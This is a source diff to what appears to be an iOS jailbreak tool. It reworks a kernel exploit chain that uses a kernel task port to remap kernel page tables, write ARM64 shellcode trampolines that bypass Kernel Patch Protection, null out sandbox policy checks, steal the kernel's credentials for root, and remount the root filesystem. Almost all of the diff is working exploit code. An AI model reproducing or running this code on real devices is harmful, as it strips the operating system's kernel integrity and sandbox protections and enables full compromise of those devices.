@@ -36,6 +36,7 @@ extern int (*dsystem)(const char *);
 #include "pte_stuff.h"
 #include "sbops.h"
 }
+#include <unordered_set>
 #include <vector>
 #include <pthread.h>
 #include <liboffsetfinder64/liboffsetfinder64.hpp>
@@ -44,6 +45,7 @@ extern int (*dsystem)(const char *);
 
 #define KBASE 0xfffffff007004000
 mach_port_t tfp0 = 0;
+static kptr_t kbase;
 
 void kpp(uint64_t kernbase, uint64_t slide);
 void runLaunchDaemons(void);
@@ -58,6 +60,7 @@ void suspend_all_threads() {
     current_thread = mach_thread_self();
     int result = task_threads(mach_task_self(), &thread_list, &thread_count);
     if (result == -1) {
+        LOG("Failed get self task\n");
         exit(1);
     }
     if (!result && thread_count) {
@@ -101,21 +104,68 @@ init_kernel(size_t (*kread)(uint64_t, void *, size_t), kptr_t kernel_base, const
 extern "C" uint64_t find_panic(void);
 
 kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
-    postProgress(@"setting hgsp4");
-    int ret1 = init_kernel(kread, kbase, NULL);
+    LOG("initing kexec\n");
+    
     bool ret2 = init_kexec();
     
-    if(ret1 && !ret2) {
-        postProgress(@"patchfinder64 or kexec failed!");
+    if(!ret2) {
+        postProgress(@"kexec failed!");
         return -1;
     }
-
+    LOG("setting hgsp4\n");
     bool ret3 = set_hgsp4(tfp0, tfp0, kbase);
     if (!ret3) {
         postProgress(@"set_hgsp4 failed!");
         return -1;
     }
-    term_kexec();
+    
+    struct sched_param sp;
+    
+    memset(&sp, 0, sizeof(struct sched_param));
+    sp.sched_priority = MAXPRI;
+    if (pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp)  == -1) {
+        printf("Failed to change priority.\n");
+        return -1;
+    } else {
+        printf("Set pthread priority: %d\n", sp.sched_priority);
+    }
+       
+    
+    std::vector<processor_t> exited_processor;
+    exited_processor.reserve(10);
+    
+    {
+        host_t myhost = mach_host_self();
+        host_t mypriv;
+        int proc;
+        kern_return_t kr;
+        processor_port_array_t processorPorts;
+        mach_msg_type_number_t procCount;
+        
+        kr = host_get_host_priv_port(myhost, &mypriv);
+        if (kr) {
+            printf ("host_get_host_priv_port: %d\n", kr);
+            return -1;
+        }
+        
+        kr = host_processors(mypriv, &processorPorts, &procCount);
+        
+        if (kr) {
+            printf ("host_processors: %d\n", kr);
+            return -1;
+        }
+        
+        for (proc = 0; proc < procCount; proc++) {
+            printf("Processor %d\n", processorPorts[proc]);
+            if (proc > 0) {
+                exited_processor.push_back(processorPorts[proc]);
+                kr = processor_exit(processorPorts[proc]);
+                if (kr != KERN_SUCCESS) {
+                    printf("Unable to stop processor %d\n", proc);
+                }
+            }
+        }
+    }
     
     resume_all_threads();
     try {
@@ -125,6 +175,17 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
         postProgress(err);
     }
+    
+    for (auto p : exited_processor) {
+        kern_return_t kr = processor_start(p);
+        if (kr != KERN_SUCCESS) {
+            printf("Unable to start processor %d %s\n",
+            p, mach_error_string(kr));
+            return -1;
+        }
+    }
+    
+    term_kexec();
     LOG("done kernelpatches!");
     runLaunchDaemons();
     printf("ok\n");
@@ -137,6 +198,102 @@ uint64_t physalloc(uint64_t size) {
     return ret;
 }
 
+#define PSZ (isvad ? 0x1000 : 0x4000)
+#define PMK (PSZ-1)
+
+class page_container : public std::unordered_set<uint64_t> {
+public:
+    page_container(size_t capacity) {
+        reserve(capacity);
+    }
+};
+
+static page_container remappage_pte_phy(100);
+static page_container remappage(512);
+
+static kptr_t _RemapPage_alloc_phy(uint64_t phy_addr, size_t size) {
+    if (remappage_pte_phy.find(phy_addr) == remappage_pte_phy.end()) {
+        uint64_t ret = physalloc(size);
+        return ret;
+    }
+    printf("Economize one PTE page!\n");
+    return 0;
+}
+
+static void _RemapPage_add_page_phy(uint64_t phy_addr) {
+    if (phy_addr == 0) {
+        printf("NULL phy addr\n");
+        return;
+    }
+    remappage_pte_phy.insert(phy_addr);
+}
+
+static void _RemapPage_internal(kptr_t address, void (^padding_cb)(kptr_t dst, kptr_t src, int level, size_t size)) {
+    pthread_yield_np();
+    pagestuff_64(address & (~PMK), ^(vm_address_t tte_addr, int addr) {
+        uint64_t tte = ReadAnywhere64(tte_addr);
+        if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {
+            NSLog(@"breakup!");
+            //uint64_t fakep = physalloc(PSZ);
+
+            uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);
+            uint64_t fakep = _RemapPage_alloc_phy(realp, PSZ);
+            if (fakep == 0) {
+                fakep = physalloc(PSZ);
+                NSLog(@"Rewrite block page meets allocated page?? Self-mapping?");
+            }
+            TTE_SETB(tte, TTE_IS_TABLE_MASK);
+            for (int i = 0; i < PSZ / 8; i++) {
+                TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);
+                WriteAnywhere64(fakep + i * 8, tte);
+            }
+            uint64_t fakep_phy = findphys_real(fakep);
+            TTE_SET(tte, TTE_PHYS_VALUE_MASK, fakep_phy);
+            _RemapPage_add_page_phy(fakep_phy);
+            WriteAnywhere64(tte_addr, tte);
+        }
+        //uint64_t newt = physalloc(PSZ);
+        uint64_t newt = _RemapPage_alloc_phy(TTE_GET(tte, TTE_PHYS_VALUE_MASK), PSZ);
+        if (newt == 0) {
+            return;
+        }
+        padding_cb(newt, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, addr, PSZ);
+        uint64_t phy_new = findphys_real(newt);
+        _RemapPage_add_page_phy(phy_new);
+        TTE_SET(tte, TTE_PHYS_VALUE_MASK, phy_new);
+        TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);
+        TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);
+        WriteAnywhere64(tte_addr, tte);
+    }, level1_table, isvad ? 1 : 2);
+}
+
+static void kernel_bcopy(kptr_t src, kptr_t dst, size_t size) {
+    kexec((kptr_t)fi.find_bcopy() + kbase - KBASE, src, dst, size, 0, 0, 0, 0);
+}
+
+static inline kptr_t NewPointer(kptr_t origptr) {
+    return (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase);
+}
+
+static void RemapPageWithCB(uint64_t x, uint64_t length, void (^padding_cb)(kptr_t dst, kptr_t src, int level, size_t size)) {
+    uint64_t from = x & (~PMK);
+    uint64_t to = (x + length + PMK) & (~PMK);
+    for (uint64_t i = from; i < to; i += PSZ) {
+        if (remappage.find(i) == remappage.end()) {
+            _RemapPage_internal(i, padding_cb);
+            remappage.insert(i);
+            continue;
+        }
+        printf("Economize one virtual page!\n");
+    }
+}
+
+static void RemapPage(uint64_t x, uint64_t length) {
+    RemapPageWithCB(x, length, ^(kptr_t dst, kptr_t src, int level, size_t size) {
+        kernel_bcopy(src, dst, size);
+    });
+}
+
 void kpp(uint64_t kernbase, uint64_t slide){
     postProgress(@"running KPP bypass");
     checkvad();
@@ -144,9 +301,10 @@ void kpp(uint64_t kernbase, uint64_t slide){
     uint64_t entryp;
 
     uint64_t gStoreBase = (uint64_t)fi.find_gPhysBase() + slide;
-
-    gPhysBase = ReadAnywhere64(gStoreBase);
-    gVirtBase = ReadAnywhere64(gStoreBase+8);
+    uint64_t ptr2[2];
+    kread(gStoreBase, ptr2, 16);
+    gPhysBase = ptr2[0];
+    gVirtBase = ptr2[1];
 
     entryp = (uint64_t)fi.find_entry() + slide;
     uint64_t rvbar = entryp & (~0xFFF);
@@ -161,13 +319,11 @@ void kpp(uint64_t kernbase, uint64_t slide){
     uint64_t cpu = ReadAnywhere64(cpu_list);
 
     uint64_t pmap_store = (uint64_t)fi.find_kernel_pmap() + slide;
+    uint64_t pmap_addr = ReadAnywhere64(pmap_store);
     NSLog(@"pmap: %llx", pmap_store);
-    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
-
-
-
-
-    uint64_t shellcode = physalloc(0x4000);
+    level1_table = ReadAnywhere64(pmap_addr);
+    
+    uint64_t shellcode = physalloc(isvad ? 0x1000 : 0x4000);
 
     /*
      ldr x30, a
@@ -181,17 +337,24 @@ void kpp(uint64_t kernbase, uint64_t slide){
      none of that squad shit tho, straight gang shit. free rondonumbanine
      */
 
-    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
-    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
-    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
+    {
+        uint32_t codes[] = { /* trampoline for idlesleep */
+            0x5800009e, //ldr x30, #0x10
+            0x580000a0, //ldr x0, #0x14
+            0xd61f0000  //br x0
+        };
+        kwrite(shellcode + 0x100, codes, sizeof(codes));
+    }
+    {
+        uint32_t codes[] = { /* trampoline for deepsleep */
+            0x5800009e, //ldr x30, #0x10
+            0x580000a0, //ldr x0, #0x14
+            0xd61f0000  //br x0
+        };
+        kwrite(shellcode + 0x200, codes, sizeof(codes));
+    }
 
-    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
-    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
-    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-
-    char buf[0x100];
-    copyin(buf, optr, 0x100);
-    copyout(shellcode+0x300, buf, 0x100);
+    kernel_bcopy(optr, shellcode + 0x300, 0x100);
 
     uint64_t physcode = findphys_real(shellcode);
 
@@ -235,8 +398,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
                 }
                 ridx++;
             }
-
-
+            free(opcz);
         }
 
         NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
@@ -248,15 +410,19 @@ void kpp(uint64_t kernbase, uint64_t slide){
     }
 
 
-    uint64_t shc = physalloc(0x4000);
+    uint64_t shc = physalloc(isvad ? 0x1000 : 0x4000);
 
     uint64_t regi = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
     uint64_t regd = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;
 
     NSLog(@"%llx - %llx", regi, regd);
-
-    for (int i = 0; i < 0x500/4; i++) {
-        WriteAnywhere32(shc+i*4, 0xd503201f);
+    
+    {
+        uint32_t codes[0x500 / 4];
+        for (int i = 0; i < 0x500 / 4; i++) {
+            codes[i] = 0xd503201f; //nop
+        }
+        kwrite(shc, codes, sizeof(codes));
     }
 
     /*
@@ -265,82 +431,102 @@ void kpp(uint64_t kernbase, uint64_t slide){
 
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
 
-    uint64_t ttbr0_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;
-
-    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
-
-    char* bbuf = (char*)malloc(0x4000);
-    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
-    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
+    uint64_t ttbr0_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler - slide + idx*4 + 24), 1) + slide;
+    uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
+    NSLog(@"ttbr0: %llx %llx", ttbr0, ttbr0_real);
+    
+    kernel_bcopy(ttbr0 - gPhysBase + gVirtBase, level0_pte, isvad == 0 ? 0x4000 : 0x1000);
 
     uint64_t physp = findphys_real(level0_pte);
 
-
-    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
-    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
-    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
-    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
-    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
-    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
-    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
-    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
-    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
-    WriteAnywhere64(shc+40, regi);
-    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
+    {
+        uint32_t codes[] = {
+            0x5800019e, // ldr x30, #40
+            0xd518203e, // msr ttbr1_el1, x30
+            0xd508871f, // tlbi vmalle1
+            0xd5033fdf, // isb
+            0xd5033f9f, // dsb sy
+            0xd5033b9f, // dsb ish
+            0xd5033fdf, // isb
+            0x5800007e, // ldr x30, 8
+            0xd65f03c0, // ret
+            0xd503201f,
+            (uint32_t)regi,
+            (uint32_t)(regi >> 32),
+            (uint32_t)physp,
+            (uint32_t)(physp >> 32)
+        };
+        kwrite(shc, codes, sizeof(codes));
+    }
 
     shc+=0x100;
-    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
-    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
-    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
-    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
-    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
-    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
-    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
-    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
-    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
-    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
-    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
+    {
+        uint32_t codes[] = {
+            0x5800019e, // ldr x30, #40
+            0xd518203e, // msr ttbr1_el1, x30
+            0xd508871f, // tlbi vmalle1
+            0xd5033fdf, // isb
+            0xd5033f9f, // dsb sy
+            0xd5033b9f, // dsb ish
+            0xd5033fdf, // isb
+            0x5800007e, // ldr x30, 8
+            0xd65f03c0, // ret
+            0xd503201f,
+            (uint32_t)regd,
+            (uint32_t)(regd >> 32),
+            (uint32_t)physp,
+            (uint32_t)(physp >> 32)
+        };
+        kwrite(shc, codes, sizeof(codes));
+    }
     shc-=0x100;
     {
-        int n = 0;
-        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
-        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str        w8, [x23]
-        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov     x0, xzr
-        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
-        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
-        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
-        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
-        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
-        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80
-        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
+        uint32_t codes[] = {
+            0x18000148, // ldr    w8, 0x28
+            0xb90002e8, // str        w8, [x23]
+            0xaa1f03e0, // mov     x0, xzr
+            0xd10103bf, // sub    sp, x29, #64
+            0xa9447bfd, // ldp    x29, x30, [sp, #64]
+            0xa9434ff4, // ldp    x20, x19, [sp, #48]
+            0xa94257f6, // ldp    x22, x21, [sp, #32]
+            0xa9415ff8, // ldp    x24, x23, [sp, #16]
+            0xa8c567fa, // ldp    x26, x25, [sp], #80
+            0xd65f03c0, // ret
+            0x0e00400f, // tbl.8b v15, { v0, v1, v2 }, v0
+        };
+        kwrite(shc + 0x200, codes, sizeof(codes));
 
     }
 
-    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
+    mach_vm_protect(tfp0, shc, isvad ? 0x1000 : 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
 
     mach_vm_address_t kppsh = 0;
-    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
+    mach_vm_allocate(tfp0, &kppsh, isvad ? 0x1000 : 0x4000, VM_FLAGS_ANYWHERE);
     {
-        int n = 0;
-
-        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr    x1, #60
-        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr    x0, #40
-        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr    TTBR1_EL1, x0
-        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz    x0, #0x30, lsl #16
-        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr    CPACR_EL1, x0
-        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr    TTBR1_EL1, x1
-        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr    x0, #-4
-        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
-        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
-        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
-        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
-        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
-        WriteAnywhere64(kppsh+n, physp); n+=8;
-        WriteAnywhere64(kppsh+n, physp); n+=8;
+        //uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
+        uint32_t codes[] = {
+            0x580001e1, // ldr    x1, #60
+            0x58000140, // ldr    x0, #40
+            0xd5182020, // msr    TTBR1_EL1, x0
+            0xd2a00600, // movz    x0, #0x30, lsl #16
+            0xd5181040, // msr    CPACR_EL1, x0
+            0xd5182021, // msr    TTBR1_EL1, x1
+            0x10ffffe0, // adr    x0, #-4
+            isvad ? 0xd5033b9f : 0xd503201f, // dsb ish (4k) / nop (16k)
+            isvad ? 0xd508871f : 0xd508873e, // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
+            0xd5033fdf, // isb
+            0xd65f03c0, // ret
+            (uint32_t)ttbr0,
+            (uint32_t)(ttbr0 >> 32),
+            (uint32_t)physp,
+            (uint32_t)(physp >> 32),
+            (uint32_t)physp,
+            (uint32_t)(physp >> 32)
+        };
+        kwrite(kppsh, codes, sizeof(codes));
     }
 
-    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
+    mach_vm_protect(tfp0, kppsh, isvad ? 0x1000 : 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
 
     WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
     WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
@@ -355,73 +541,33 @@ void kpp(uint64_t kernbase, uint64_t slide){
      */
 
     uint64_t cpacr_addr = (uint64_t)fi.find_cpacr_write() + slide;
-#define PSZ (isvad ? 0x1000 : 0x4000)
-#define PMK (PSZ-1)
-
-
-#define RemapPage_(address) \
-pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
-uint64_t tte = ReadAnywhere64(tte_addr);\
-if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
-NSLog(@"breakup!");\
-uint64_t fakep = physalloc(PSZ);\
-uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
-TTE_SETB(tte, TTE_IS_TABLE_MASK);\
-for (int i = 0; i < PSZ/8; i++) {\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
-WriteAnywhere64(fakep+i*8, tte);\
-}\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
-WriteAnywhere64(tte_addr, tte);\
-}\
-uint64_t newt = physalloc(PSZ);\
-copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
-copyout(newt, bbuf, PSZ);\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
-TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
-TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
-WriteAnywhere64(tte_addr, tte);\
-}, level1_table, isvad ? 1 : 2);
-
-#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
-
-    uint64_t* remappage = (uint64_t*)calloc(512, 8);
-
-    int remapcnt = 0;
-
-
-#define RemapPage(x)\
-{\
-int fail = 0;\
-for (int i = 0; i < remapcnt; i++) {\
-if (remappage[i] == (x & (~PMK))) {\
-fail = 1;\
-}\
-}\
-if (fail == 0) {\
-RemapPage_(x);\
-RemapPage_(x+PSZ);\
-remappage[remapcnt++] = (x & (~PMK));\
-}\
-}
 
     level1_table = physp - gPhysBase + gVirtBase;
-    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
-
+    WriteAnywhere64(pmap_addr, level1_table);
+    kexec(kppsh, 0, 0, 0, 0, 0, 0, 0);
 
     uint64_t shtramp = kernbase + ((const struct mach_header *)fi.kdata())->sizeofcmds + sizeof(struct mach_header_64);
-    RemapPage(cpacr_addr);
-    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
+    RemapPage(cpacr_addr, 4);
+    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr) / 4) & 0x3FFFFFF));
 
-    RemapPage(shtramp);
-    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
-    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
-    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
+    RemapPage(shtramp, 16);
+    {
+        uint32_t codes[] = {
+            0x58000041,
+            0xd61f0020,
+            (uint32_t)kppsh,
+            (uint32_t)(kppsh >> 32)
+        };
+        kwrite(NewPointer(shtramp), codes, sizeof(codes));
+    }
 
 
     WriteAnywhere64((uint64_t)fi.find_idlesleep_str_loc()+slide, physcode+0x100);
     WriteAnywhere64((uint64_t)fi.find_deepsleep_str_loc()+slide, physcode+0x200);
-
+    
+    for (int i = 0; i < z; i++) {
+        WriteAnywhere64(plist[i], physcode + 0x100);
+    }
 
     //kernelpatches
     postProgress(@"patching kernel");
@@ -455,45 +601,37 @@ remappage[remapcnt++] = (x & (~PMK));\
             str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
         }
         NSLog([str stringByAppendingString:@"]"],patch._location);
-        RemapPage((uint64_t)(patch._location+slide));
-        for (size_t i=0; i<patch._patchSize;i+=4) {
-            int diff = (int)(patch._patchSize-i);
-            if (diff >=8){
-                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), *(uint64_t*)((uint8_t*)patch._patch+i));
-            }else{
-                uint64_t p = ReadAnywhere64((uint64_t)patch._location+slide+i);
-                p &= ~(((uint64_t)1<<(8*diff))-1);
-                p |= ((*(uint64_t*)((uint8_t*)patch._patch+i)) % ((uint64_t)1<<(8*diff)));
-                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), p);
-            }
-        }
+        RemapPage((uint64_t)patch._location + slide, patch._patchSize);
+        kwrite(NewPointer((uint64_t)patch._location + slide), patch._patch, patch._patchSize);
     };
 
 
     for (auto patch : kernelpatches){
         dopatch(patch);
     }
-
-    postProgress(@"patching sandbox");
-    uint64_t sbops = (uint64_t)fi.find_sbops()+slide;
-    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
-
-    uint64_t nopag = (sbops_end - sbops)/(PSZ);
-
-    for (int i = 0; i < nopag; i++) {
-        RemapPage(((sbops + i*(PSZ)) & (~PMK)));
-    }
-
-    NSLog(@"Found sbops 0x%llx size: %lld\n", sbops, sbops_end - sbops);
     
-    struct mac_policy_ops *ops = (struct mac_policy_ops *)malloc(sizeof(struct mac_policy_ops));
-    if (ops == NULL) {
+    postProgress(@"fetching sandbox");
+    
+    uint64_t sbops = (uint64_t)fi.find_sbops() + slide;
+    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
+    uint64_t sbops_start_page = sbops & (~PMK);
+    uint64_t sbops_end_page = (sbops_end + PMK) & (~PMK);
+    //uint64_t sbops_end_offset = sbops_end - (sbops_end & (~PMK));
+    uint64_t nopag = (sbops_end_page - sbops_start_page) / PSZ;
+    
+    NSLog(@"Found sbops 0x%llx size: %lld\n", sbops, sbops_end_page - sbops);
+    
+    void *buf = malloc(sbops_end_page - sbops_start_page);
+    
+    if (buf == NULL) {
         postProgress(@"Error malloc mac_policy");
         printf("Error malloc mac_policy\n");
         return;
     }
     
-    kread(sbops, (void*)ops, sizeof(*ops));
+    kread(sbops_start_page, buf, sbops_end_page - sbops_start_page);
+    
+    struct mac_policy_ops *ops = (struct mac_policy_ops *)((char*)buf + (sbops - sbops_start_page));
     
     ops->mpo_file_check_mmap = 0;
     ops->mpo_vnode_check_rename = 0;
@@ -527,22 +665,39 @@ remappage[remapcnt++] = (x & (~PMK));\
     ops->mpo_proc_check_fork = 0;
     ops->mpo_iokit_check_get_property = 0;
     
-    kwrite(NewPointer(sbops), (void*)ops, sizeof(*ops));
-    free(ops);
-    ops = NULL;
+
+    postProgress(@"remapping sandbox");
+    
+
+    for (int i = 0; i < nopag; i++) {
+        RemapPageWithCB(sbops_start_page + i * (PSZ), PSZ, ^(kptr_t dst, kptr_t src, int level, size_t size) {
+            if (level != 3) {
+                kernel_bcopy(src, dst, size);
+            } else {
+                kwrite(dst, (char*)buf + i * (PSZ), size);
+            }
+        });
+    }
+    
+    free(buf);
+    buf = nullptr;
+    postProgress(@"setting Marijuan");
     
     uint64_t marijuanoff = (uint64_t)fi.find_release_arm()+slide;
 
     // smoke trees
-    RemapPage(marijuanoff);
-    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)"Marijuan");
-
-    for (int i = 0; i < z; i++) {
-        WriteAnywhere64(plist[i], physcode + 0x100);
-    }
+    const char Marijuan[] = {'M', 'a', 'r', 'i', 'j', 'u', 'a', 'n'};
+    RemapPage(marijuanoff, sizeof(Marijuan));
+    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)Marijuan);
+    
+    postProgress(@"i_can_has_debugger?");
 
     //check for i_can_has_debugger
-    while (ReadAnywhere32((uint64_t)kernelpatches.at(0)._location+slide) != 1) {
+    uint32_t i_can_has_debugger;
+    auto ichd_patch = fi.find_i_can_has_debugger_patch_off();
+    while ((i_can_has_debugger = ReadAnywhere32((uint64_t)ichd_patch._location + slide)) != 1) {
+        //kwrite(NewPointer((uint64_t)ichd_patch._location + slide), ichd_patch._patch, ichd_patch._patchSize);
+        printf("i_can_has_debugger %d\n", i_can_has_debugger);
         sleep(1);
     }
     
@@ -552,8 +707,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     statfs("/", &output);
 
     char* nm = strdup("/dev/disk0s1s1");
-    //int mntr = mount("hfs", "/", 0x10000, &nm);
-    //int mntr = mount("apfs", "/", 0x10000, &nm);
     int mntr = mount(output.f_fstypename, "/", 0x10000, &nm);
     printf("Mount succeeded? %d\n",mntr);
     if (mntr != 0) {
@@ -772,8 +925,6 @@ void runLaunchDaemons(void){
 
 extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase, offsets_t *off);
 
-static kptr_t kbase;
-
 extern "C" int jailbreak_system(const char *command) {
     return _jailbreak_with_cb([=](task_t tfp0_, kptr_t kbase, void *data) {
         resume_all_threads();
@@ -792,6 +943,13 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
     LOG("done sock port!\n");
     ::tfp0 = tfp0;
     
+    LOG("Initing patchfinder\n");
+    int ret1 = init_kernel(kread, kbase, NULL);
+    if (ret1) {
+        postProgress(@"patchfinder64 failed");
+        return -1;
+    }
+    
     kptr_t kernel_task_addr;
     kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
     kptr_t kernel_bsd_info;
@@ -800,6 +958,7 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
     kread(kernel_bsd_info + off->proc_ucred, &kernel_ucred, sizeof(kernel_ucred));
     
     if (proc_struct_addr() == 0) {
+        LOG("Failed get self proc struct addr");
         return -1;
     }
 
@@ -812,7 +971,7 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
         printf("Failed steal kernel ucred\n");
         return -1;
     }
-    
+    LOG("done setuid0!");
     callback(tfp0, kbase, cb_data);
     kwrite(proc_struct_addr() + off->proc_ucred, &self_ucred, sizeof(self_ucred));
     
